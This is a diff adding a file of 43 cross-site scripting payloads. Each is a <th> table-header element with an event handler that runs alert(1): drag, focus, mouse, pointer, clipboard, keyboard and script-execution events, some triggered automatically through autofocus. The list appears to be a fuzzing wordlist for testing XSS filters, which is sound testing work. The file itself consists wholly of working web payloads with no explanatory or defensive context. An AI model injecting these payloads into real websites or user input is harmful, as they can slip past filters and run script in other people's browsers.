@@ -1,0 +1,43 @@
+<th draggable="true" ondrag="alert(1)">test</th>
+<th draggable="true" ondragend="alert(1)">test</th>
+<th draggable="true" ondragenter="alert(1)">test</th>
+<th draggable="true" ondragleave="alert(1)">test</th>
+<th draggable="true" ondragstart="alert(1)">test</th>
+<th id=x tabindex=1 onactivate=alert(1)></th>
+<th id=x tabindex=1 onbeforeactivate=alert(1)></th>
+<th id=x tabindex=1 onbeforedeactivate=alert(1)></th><input autofocus>
+<th id=x tabindex=1 ondeactivate=alert(1)></th><input id=y autofocus>
+<th id=x tabindex=1 onfocus=alert(1)></th>
+<th id=x tabindex=1 onfocusin=alert(1)></th>
+<th onafterscriptexecute=alert(1)><script>1</script>
+<th onbeforecopy="alert(1)" contenteditable>test</th>
+<th onbeforecut="alert(1)" contenteditable>test</th>
+<th onbeforepaste="alert(1)" contenteditable>test</th>
+<th onbeforescriptexecute=alert(1)><script>1</script>
+<th onblur=alert(1) tabindex=1 id=x></th><input autofocus>
+<th onclick="alert(1)">test</th>
+<th oncontextmenu="alert(1)">test</th>
+<th oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<th oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<th ondblclick="alert(1)" autofocus tabindex=1>test</th>
+<th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>
+<th onkeydown="alert(1)" contenteditable>test</th>
+<th onkeypress="alert(1)" contenteditable>test</th>
+<th onkeyup="alert(1)" contenteditable>test</th>
+<th onmousedown="alert(1)">test</th>
+<th onmouseenter="alert(1)">test</th>
+<th onmouseleave="alert(1)">test</th>
+<th onmousemove="alert(1)">test</th>
+<th onmouseout="alert(1)">test</th>
+<th onmouseover="alert(1)">test</th>
+<th onmouseup="alert(1)">test</th>
+<th onmousewheel=alert(1)>requires scrolling
+<th onpaste="alert(1)" contenteditable>test</th>
+<th onpointerdown=alert(1)>XSS</th>
+<th onpointerenter=alert(1)>XSS</th>
+<th onpointerleave=alert(1)>XSS</th>
+<th onpointermove=alert(1)>XSS</th>
+<th onpointerout=alert(1)>XSS</th>
+<th onpointerover=alert(1)>XSS</th>
+<th onpointerrawupdate=alert(1)>XSS</th>
+<th onpointerup=alert(1)>XSS</th>
